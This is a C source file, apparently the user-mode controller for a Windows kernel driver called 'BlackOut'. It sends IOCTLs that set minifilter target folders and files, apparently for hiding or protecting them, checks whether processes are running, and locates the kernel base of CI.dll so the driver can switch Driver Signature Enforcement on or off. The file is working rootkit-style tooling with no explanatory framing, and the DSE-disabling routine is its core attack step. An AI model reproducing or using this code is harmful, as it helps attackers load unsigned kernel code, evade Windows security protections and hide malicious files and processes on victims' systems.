#include "cGlobalDef.h"
#include "../BlackOut/ioctl.h"

HANDLE OpenDevice() {
    HANDLE hDevice = CreateFileA(
        DEVICE_NAME,
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "\n[-] Failed to open device. Error: %lu\n", GetLastError());
    }

    return hDevice;
}

BOOL SendIoControl(HANDLE hDevice, DWORD ioctlCode, const char* data) {
    DWORD bytesReturned;
    return DeviceIoControl(
        hDevice,
        ioctlCode,
        (LPVOID)data,
        data ? (DWORD)strlen(data) + 1 : 0,
        NULL,
        0,
        &bytesReturned,
        NULL
    );
}

/* ===========================================

                    Minifilter

============================================== */

void SetDeviceIoControl(HANDLE hDevice, DWORD ioControlCode, PVOID inBuffer, DWORD inBufferSize, const char* successMsg, const char* errorMsg) {
    DWORD bytesReturned;
    BOOL result = DeviceIoControl(
        hDevice,
        ioControlCode,
        inBuffer,
        inBufferSize,
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (result) {
        printf("%s\n", successMsg);
    }
    else {
        printf("%s Error: %lu\n", errorMsg, GetLastError());
    }
}

void GetDeviceNameFromPath(LPCSTR fullPath, LPSTR deviceName, DWORD deviceNameSize) {
    CHAR drive[3] = { fullPath[0], fullPath[1], '\0' };
    CHAR targetPath[MAX_PATH];

    if (QueryDosDeviceA(drive, targetPath, MAX_PATH) > 0) {
        snprintf(deviceName, deviceNameSize, "%s%s", targetPath, fullPath + 2);
    }
    else {
        deviceName[0] = '\0';
    }
}

void PrintPaths(const char* fullPath, const char* parentDir, const char* folderName, const char* deviceName) {
    printf("\n[+] Full path provided by user: %s\n\n", fullPath);
    printf("Parent directory: %s\n", parentDir);
    printf("Folder/File name: %s\n", folderName);
    printf("Device path: %s\n", deviceName);
}

BOOL SetTargetFolder(HANDLE hDevice, const char* deviceName) {
    size_t deviceNameLen = strlen(deviceName);
    size_t bufferSize = sizeof(UNICODE_STRING) + (deviceNameLen + 1) * sizeof(WCHAR);
    PUNICODE_STRING pTargetFolder = (PUNICODE_STRING)malloc(bufferSize);

    if (!pTargetFolder) {
        fprintf(stderr, "\n[-] Failed to allocate memory.\n");
        return FALSE;
    }

    pTargetFolder->Length = (USHORT)(deviceNameLen * sizeof(WCHAR));
    pTargetFolder->MaximumLength = (USHORT)((deviceNameLen + 1) * sizeof(WCHAR));
    pTargetFolder->Buffer = (PWCH)((char*)pTargetFolder + sizeof(UNICODE_STRING));
    mbstowcs_s(NULL, pTargetFolder->Buffer, deviceNameLen + 1, deviceName, deviceNameLen);

    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_SET_TARGET_FOLDER,
        pTargetFolder,
        (DWORD)bufferSize,
        NULL,
        0,
        NULL,
        NULL
    );

    free(pTargetFolder);

    return result;
}

BOOL SetTargetFile(HANDLE hDevice, const char* folderName) {
    size_t folderNameLen = strlen(folderName);
    size_t bufferSize = sizeof(UNICODE_STRING) + (folderNameLen + 1) * sizeof(WCHAR);
    PUNICODE_STRING pTargetFile = (PUNICODE_STRING)malloc(bufferSize);

    if (!pTargetFile) {
        fprintf(stderr, "\n[-] Failed to allocate memory.\n");
        return FALSE;
    }

    pTargetFile->Length = (USHORT)(folderNameLen * sizeof(WCHAR));
    pTargetFile->MaximumLength = (USHORT)((folderNameLen + 1) * sizeof(WCHAR));
    pTargetFile->Buffer = (PWCH)((char*)pTargetFile + sizeof(UNICODE_STRING));
    mbstowcs_s(NULL, pTargetFile->Buffer, folderNameLen + 1, folderName, folderNameLen);

    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_SET_TARGET_FILE,
        pTargetFile,
        (DWORD)bufferSize,
        NULL,
        0,
        NULL,
        NULL
    );

    free(pTargetFile);

    return result;
}

BOOL InitializePathsAndDevice(int argc, char* argv[], CHAR* fullPath, CHAR* parentDir, CHAR* folderName, CHAR* deviceName, HANDLE* hDevice) {
    strncpy_s(fullPath, MAX_PATH, argv[argc - 1], _TRUNCATE);
    fullPath[MAX_PATH - 1] = '\0'; // Ensure null-termination

    strncpy_s(parentDir, MAX_PATH, fullPath, _TRUNCATE);
    parentDir[MAX_PATH - 1] = '\0'; // Ensure null-termination
    PathRemoveFileSpecA(parentDir);
    strncpy_s(folderName, MAX_PATH, fullPath + strlen(parentDir) + 1, _TRUNCATE);
    folderName[MAX_PATH - 1] = '\0'; // Ensure null-termination

    GetDeviceNameFromPath(parentDir, deviceName, MAX_PATH);

    *hDevice = OpenDevice();
    if (*hDevice == INVALID_HANDLE_VALUE) return FALSE;

    return TRUE;
}

/* ===========================================

                Process Protection

============================================== */

// Function to check if a process with the given PID exists
BOOL IsProcessRunning(DWORD pid) {
    BOOL exists = FALSE;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe)) {
            do {
                if (pe.th32ProcessID == pid) {
                    exists = TRUE;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return exists;
}

/* ===========================================

        Digital Signature Enforcement

============================================== */

void SetCiDllBase(HANDLE hDevice, PVOID ciDllBase) {
    SetDeviceIoControl(hDevice, IOCTL_SET_CI_DLL_BASE, &ciDllBase, sizeof(ciDllBase),
        "\n[+] CI_DLL_BASE set successfully", "\n[-] Failed to set CI_DLL_BASE.");
}

void SetDseMode(HANDLE hDevice, BOOLEAN enableDSE) {
    DSE_MODE dseMode = { enableDSE };
    SetDeviceIoControl(hDevice, IOCTL_SET_DSE_MODE, &dseMode, sizeof(dseMode),
        enableDSE ? "\n[+] DSE mode enabled" : "\n[+] DSE mode disabled", "\n[-] Failed to set DSE mode.");
}

PVOID GetCiDllBase() {
    LPVOID drivers[1024];
    DWORD cbNeeded;
    int cDrivers, i;
    TCHAR szDriver[1024];

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        cDrivers = cbNeeded / sizeof(drivers[0]);

        for (i = 0; i < cDrivers; i++) {
            if (GetDeviceDriverBaseName(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0]))) {
                if (_tcscmp(szDriver, TEXT("CI.dll")) == 0) {
                    return drivers[i];
                }
            }
        }
    }
    else {
        printf("\n[-] EnumDeviceDrivers failed; error = %d\n", GetLastError());
    }

    return NULL;
}